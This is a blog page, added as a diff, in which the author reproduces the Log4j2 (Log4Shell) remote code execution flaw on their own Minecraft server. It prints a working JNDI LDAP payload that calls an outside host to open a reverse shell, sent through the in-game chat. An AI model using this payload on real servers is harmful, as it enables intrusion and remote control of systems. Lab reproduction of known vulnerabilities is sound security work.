@@ -1,0 +1,32 @@
+<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabinet | 【漏洞复现】minecraft 中的 log4j2 rce</title><meta name="description" content="&lt;p&gt;log4j 还是1day的时候，对minecraft服务器进行漏洞调试&lt;/p&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabinet"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabinet" type="application/atom+xml">
+</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabinet</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">【漏洞复现】minecraft 中的 log4j2 rce</h3><div class="article__date metadata"><div class="post-info">2021/12/12</div></div><div class="article__tags metadata">Tags:
+<a class="article__tags__link metadata" href="/tags/cve/">cve</a><a class="article__tags__link metadata" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></div><div class="article__body"><p>log4j 还是1day的时候，对minecraft服务器进行漏洞调试</p>
+<span id="more"></span>
+<h2 id="环境搭建"><a class="markdownIt-Anchor" href="#环境搭建"></a> 环境搭建</h2>
+<p>在服务器上搭建了mc服务端，这个照着网上的教程做的</p>
+<p>这里用的不是官方包，而是这个：<a target="_blank" rel="noopener" href="https://www.joe1sn.top/server.jar">https://www.joe1sn.top/server.jar</a></p>
+<p><img src="https://img.joe1sn.top/uploads/big/c0ad4eaa2b0aa88be5531b2c9773fcdf.png" alt="" /></p>
+<p>java版本是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openjdk version &quot;1.8.0_162&quot;</span><br><span class="line">OpenJDK Runtime Environment (build 1.8.0_162-8u162-b12-1-b12)</span><br><span class="line">OpenJDK 64-Bit Server VM (build 25.162-b12, mixed mode)</span><br></pre></td></tr></table></figure>
+<p>特意换的老版本</p>
+<h2 id="开始攻击"><a class="markdownIt-Anchor" href="#开始攻击"></a> 开始攻击</h2>
+<p><img src="https://img.joe1sn.top/uploads/big/162baab735cc48e3bfebc768d6b9a8d9.png" alt="" /></p>
+<p>这里使用了<a target="_blank" rel="noopener" href="https://github.com/feihong-cs/JNDIExploit%E8%BF%99%E4%B8%AA%E5%B7%A5%E5%85%B7">https://github.com/feihong-cs/JNDIExploit这个工具</a></p>
+<p>在本地搭建ngrok代理本地的监听端口</p>
+<p><img src="https://img.joe1sn.top/uploads/big/751fb74af09a973eccbec7112013df60.png" alt="" /></p>
+<p>然后生成利用EXP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://150.158.75.102:1389/Basic/ReverseShell/3.133.207.110/13605&#125;</span><br></pre></td></tr></table></figure>
+<p>登陆服务器在聊天框中输入</p>
+<p>回车等待后getshell</p>
+<p><img src="https://img.joe1sn.top/uploads/big/3efd5f2dcb4a34be058e5002b6109196.png" alt="" /></p>
+<p>但是服务器会崩溃</p>
+<p><img src="https://img.joe1sn.top/uploads/big/ca6175f25f68e2d074afae5b5747d4e2.png" alt="" /></p>
+<p>上面的payload崩溃了一个线程，但是其他线程仍然在运行，所以使用<code>kill -9</code>才能关闭</p>
+</div></article><section class="comments"><div id="disqus_thread"></div><script>var disqus_shortname = 'disqus';
+(function () {
+  var dsq = document.createElement('script');
+  dsq.type = 'text/javascript';
+  dsq.async = true;
+  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();</script><script id="dsq-count-scr" src="//#{theme.disqus}.disqus.com/count.js" async></script></section><div class="pagination"><a class="pagination__link pagination__prev" href="/2022/03/16/java-d1-Junit/">prev_post</a><a class="pagination__link pagination__next" href="/2021/03/30/Maleware/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2023 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>
